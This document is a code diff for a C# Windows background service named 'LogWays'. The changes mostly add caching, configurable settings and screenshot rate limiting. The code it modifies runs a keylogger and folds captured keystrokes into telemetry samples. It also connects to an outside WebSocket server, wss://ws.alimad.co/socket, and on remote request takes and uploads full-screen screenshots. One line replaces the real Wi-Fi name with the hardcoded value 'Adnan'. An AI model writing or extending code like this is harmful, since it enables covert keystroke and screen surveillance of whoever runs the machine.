@@ -11,13 +11,17 @@ namespace LogWays;
 
 public class Worker : BackgroundService
 {
-    const string WS_URI = false ? "ws://localhost:8392/socket" : "wss://ws.alimad.co/socket";
-    const bool LIVE = false;
+    private static readonly AppSettings Settings = AppSettings.LoadOrCreateDefault();
+
+    const double TOTAL_RAM = 8L * 1024 * 1024 * 1024;
+    const int CPU_CORES = 8;
+
+    private readonly bool LIVE = Settings.Live;
+    private readonly string WS_URI = Settings.WsUri;
+
     static string ipa = "0.0.0.0";
     private static readonly bool SlackMode = false;
     private System.Threading.Timer? _flushTimer;
-    const double TOTAL_RAM = 8L * 1024 * 1024 * 1024;
-    const int CPU_CORES = 8;
     uint last_process = 0;
 
     readonly Dictionary<int, double> lastCpu = [];
@@ -55,6 +59,18 @@ public class Worker : BackgroundService
 
     [StructLayout(LayoutKind.Sequential)]
     struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
+    private DateTime _lastLocalIpUpdate = DateTime.MinValue;
+    private string _cachedLocalIp = "0.0.0.0";
+
+    private DateTime _lastBatteryUpdate = DateTime.MinValue;
+    private int _cachedBattery = 0;
+    private bool _cachedCharging = false;
+
+    private DateTime _lastWindowStatusUpdate = DateTime.MinValue;
+    private Dictionary<string, bool> _cachedWindowStatus = new();
+
+    private DateTime _lastScreenshotSent = DateTime.MinValue;
+
     public Worker()
     {
         KeyLogger.Start();
@@ -66,13 +82,14 @@ public class Worker : BackgroundService
         }
         
         SessionLogger.StartSession();
-        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, 30_000, 30_000);
+        int flushMs = Settings.FlushIntervalMs <= 0 ? 30_000 : Settings.FlushIntervalMs;
+        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, flushMs, flushMs);
         AppDomain.CurrentDomain.ProcessExit += (_, __) => SessionLogger.Flush();
     }
 
     protected override async Task ExecuteAsync(CancellationToken token)
     {
-        var sampleInterval = TimeSpan.FromSeconds(1);
+        var sampleInterval = TimeSpan.FromSeconds(1.5);
 
         while (!token.IsCancellationRequested)
         {
@@ -112,8 +129,8 @@ public class Worker : BackgroundService
                         if (timeDelta > 0) cpuPercent = (cpuDelta / timeDelta) * 100.0 / CPU_CORES;
                     }
 
-                    int battery = BatteryMonitor.GetBatteryPercent();
-                    bool charge = BatteryMonitor.IsPluggedIn();
+                    int battery = GetBatteryPercentCached();
+                    bool charge = GetChargingCached();
 
                     lastCpu[p.Id] = nowCpu;
                     lastTime[p.Id] = nowTime;
@@ -128,11 +145,12 @@ public class Worker : BackgroundService
                     if (charge) sample["charging"] = true;
                     if (LIVE)
                     {
-                        sample["wifi"] = WifiHelper.GetWifiName();
+                        // User requested to not fetch actual Wi‑Fi name and always use "Adnan"
+                        sample["wifi"] = "Adnan";
                     }
                     sample["isIdle"] = IsIdle();
                     string keys = KeyLogger.GetKeys();
-                    sample["meta"] = GetWindowStatus();
+                    sample["meta"] = GetWindowStatusCached();
                     sample["fullscreen"] = IsFullscreen(hwnd);
                     var (left, right) = IsSplitScreen(hwnd);
                     sample["splitLeft"] = left;
@@ -150,7 +168,7 @@ public class Worker : BackgroundService
                     sample["isIdle"] = true;
                     sample["isSleeping"] = true;
                 }
-                sample["localIp"] = GetLocalIPAddress();
+                sample["localIp"] = GetLocalIPAddressCached();
             }
             catch (Exception ex)
             {
@@ -185,6 +203,18 @@ public class Worker : BackgroundService
         }
         catch { return "0.0.0.0"; }
     }
+    string GetLocalIPAddressCached()
+    {
+        if ((DateTime.UtcNow - _lastLocalIpUpdate).TotalSeconds < 60)
+        {
+            return _cachedLocalIp;
+        }
+
+        _cachedLocalIp = GetLocalIPAddress();
+        _lastLocalIpUpdate = DateTime.UtcNow;
+        return _cachedLocalIp;
+    }
+
     static string GetLocalIPAddress()
     {
         try
@@ -253,13 +283,22 @@ public class Worker : BackgroundService
 
                         using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(buffer, 0, result.Count));
                         var obj = JsonSerializer.Deserialize<Dictionary<string, object>>(doc.RootElement.GetRawText());
-                        SessionLogger.LogWebSocketMessage("received", obj);
+                        if (obj is not null)
+                        {
+                            SessionLogger.LogWebSocketMessage("received", obj);
+                        }
 
                         if (doc.RootElement.TryGetProperty("type", out var t) && t.GetString() == "request")
                         {
                             string targetDevice = doc.RootElement.GetProperty("device").GetString() ?? "";
                             if (targetDevice == deviceName)
                             {
+                                // Rate limit screenshot uploads: max 1 request per second, discard extra
+                                if ((DateTime.UtcNow - _lastScreenshotSent).TotalSeconds < 1)
+                                {
+                                    continue;
+                                }
+
                                 try
                                 {
                                     string screenshotBase64 = TakeScreenshotBytes(out var bytes);
@@ -279,6 +318,7 @@ public class Worker : BackgroundService
                                     });
                                     var bytesToSend = Encoding.UTF8.GetBytes(payload);
                                     await ws.SendAsync(new ArraySegment<byte>(bytesToSend), WebSocketMessageType.Text, true, CancellationToken.None);
+                                    _lastScreenshotSent = DateTime.UtcNow;
                                 }
                                 catch (Exception ex)
                                 {
@@ -321,7 +361,8 @@ public class Worker : BackgroundService
 
     string TakeScreenshotBytes(out byte[] bytes)
     {
-        var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+        var screen = System.Windows.Forms.Screen.PrimaryScreen;
+        var bounds = screen?.Bounds ?? new Rectangle(0, 0, 1920, 1080);
         using var bmp = new Bitmap(bounds.Width, bounds.Height);
         using var g = Graphics.FromImage(bmp);
         g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
@@ -329,6 +370,18 @@ public class Worker : BackgroundService
         bmp.Save(ms, ImageFormat.Png);
         bytes = ms.ToArray();
         return Convert.ToBase64String(bytes);
+    }
+
+    Dictionary<string, bool> GetWindowStatusCached()
+    {
+        if ((DateTime.UtcNow - _lastWindowStatusUpdate).TotalSeconds < 5 && _cachedWindowStatus.Count > 0)
+        {
+            return _cachedWindowStatus;
+        }
+
+        _cachedWindowStatus = GetWindowStatus();
+        _lastWindowStatusUpdate = DateTime.UtcNow;
+        return _cachedWindowStatus;
     }
 
     static Dictionary<string, bool> GetWindowStatus()
@@ -357,6 +410,28 @@ public class Worker : BackgroundService
 
         return map;
     }
+    int GetBatteryPercentCached()
+    {
+        if ((DateTime.UtcNow - _lastBatteryUpdate).TotalSeconds >= 30)
+        {
+            _cachedBattery = BatteryMonitor.GetBatteryPercent();
+            _cachedCharging = BatteryMonitor.IsPluggedIn();
+            _lastBatteryUpdate = DateTime.UtcNow;
+        }
+        return _cachedBattery;
+    }
+
+    bool GetChargingCached()
+    {
+        if ((DateTime.UtcNow - _lastBatteryUpdate).TotalSeconds >= 30)
+        {
+            _cachedBattery = BatteryMonitor.GetBatteryPercent();
+            _cachedCharging = BatteryMonitor.IsPluggedIn();
+            _lastBatteryUpdate = DateTime.UtcNow;
+        }
+        return _cachedCharging;
+    }
+
     static bool IsFullscreen(IntPtr hWnd)
     {
         GetWindowRect(hWnd, out RECT r);
